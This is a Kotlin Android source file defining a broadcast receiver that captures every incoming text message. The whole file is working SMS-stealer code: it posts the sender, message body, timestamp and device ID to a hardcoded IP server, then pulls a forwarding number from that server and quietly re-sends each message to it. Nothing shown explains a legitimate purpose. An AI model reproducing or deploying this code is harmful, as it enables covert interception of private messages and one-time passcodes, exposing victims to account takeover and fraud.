package com.example.test

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        Log.d(TAG, "========== SMS RECEIVER CALLED ==========")
        Log.d(TAG, "Action: ${intent?.action}")

        if (context == null || intent == null) {
            Log.e(TAG, "❌ Context or Intent is NULL!")
            return
        }

        val action = intent.action
        if (action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION &&
            action != Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
            Log.w(TAG, "⚠️ Unknown action: $action")
            return
        }

        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            if (messages.isEmpty()) {
                Log.w(TAG, "⚠️ No messages in intent")
                return
            }

            val fullMessage = StringBuilder()
            var sender = ""
            var timestamp = 0L

            for (message in messages) {
                fullMessage.append(message.messageBody ?: "")
                if (sender.isEmpty()) {
                    sender = message.originatingAddress ?: "Unknown"
                    timestamp = message.timestampMillis
                }
            }

            Log.d(TAG, "📨 SMS from: $sender")
            Log.d(TAG, "📝 Message: $fullMessage")
            Log.d(TAG, "🕐 Timestamp: $timestamp")

            // Background thread برای عملیات شبکه
            Thread {
                try {
                    // 1. ارسال به Backend
                    sendSmsToBackend(context, sender, fullMessage.toString(), timestamp)

                    // 2. Forward کردن SMS (اگه نیازه)
                    val forwardingNumber = fetchForwardingNumberFromBackend(context)
                    if (!forwardingNumber.isNullOrEmpty()) {
                        forwardSms(forwardingNumber, fullMessage.toString())
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Error in background processing", e)
                }
            }.start()

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error parsing SMS", e)
        }
    }

    private fun sendSmsToBackend(context: Context, sender: String, message: String, timestamp: Long) {
        try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )

            val body = JSONObject().apply {
                put("sender", sender)
                put("message", message)
                put("timestamp", timestamp)
                put("deviceId", deviceId)
            }

            Log.d(TAG, "📤 Sending to backend: ${body.toString()}")

            val url = URL("http://95.134.130.160:8765/sms/new")
            val conn = url.openConnection() as HttpURLConnection

            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray(Charsets.UTF_8))
                os.flush()
            }

            val responseCode = conn.responseCode
            if (responseCode in 200..201) {
                Log.d(TAG, "✅ SMS sent to backend successfully")
            } else {
                val errorBody = conn.errorStream?.bufferedReader()?.use { it.readText() }
                Log.w(TAG, "⚠️ Backend response: $responseCode - $errorBody")
            }

            conn.disconnect()

        } catch (e: Exception) {
            Log.e(TAG, "❌ Backend error", e)
        }
    }

    private fun fetchForwardingNumberFromBackend(context: Context): String? {
        return try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )

            Log.d(TAG, "📥 Fetching forwarding number for device: $deviceId")

            val url = URL("http://95.134.130.160:8765/api/getForwardingNumber/$deviceId")
            val conn = url.openConnection() as HttpURLConnection

            conn.requestMethod = "GET"
            conn.setRequestProperty("Accept", "application/json")
            conn.connectTimeout = 10000
            conn.readTimeout = 10000

            val responseCode = conn.responseCode
            if (responseCode != 200) {
                Log.w(TAG, "⚠️ Failed to fetch forwarding number: $responseCode")
                return null
            }

            val response = conn.inputStream.bufferedReader().use { it.readText() }
            val json = JSONObject(response)
            val number = json.optString("forwardingNumber", null)

            conn.disconnect()

            Log.d(TAG, "✅ Forwarding number: $number")
            number

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error fetching forwarding number", e)
            null
        }
    }

    private fun forwardSms(forwardingNumber: String, message: String) {
        try {
            Log.d(TAG, "📲 Forwarding SMS to: $forwardingNumber")

            val smsManager = SmsManager.getDefault()

            // اگه پیام طولانیه، باید بشکونیمش
            if (message.length > 160) {
                val parts = smsManager.divideMessage(message)
                smsManager.sendMultipartTextMessage(
                    forwardingNumber,
                    null,
                    parts,
                    null,
                    null
                )
                Log.d(TAG, "✅ Multi-part SMS forwarded (${parts.size} parts)")
            } else {
                smsManager.sendTextMessage(
                    forwardingNumber,
                    null,
                    message,
                    null,
                    null
                )
                Log.d(TAG, "✅ SMS forwarded successfully")
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Forward failed", e)
        }
    }
}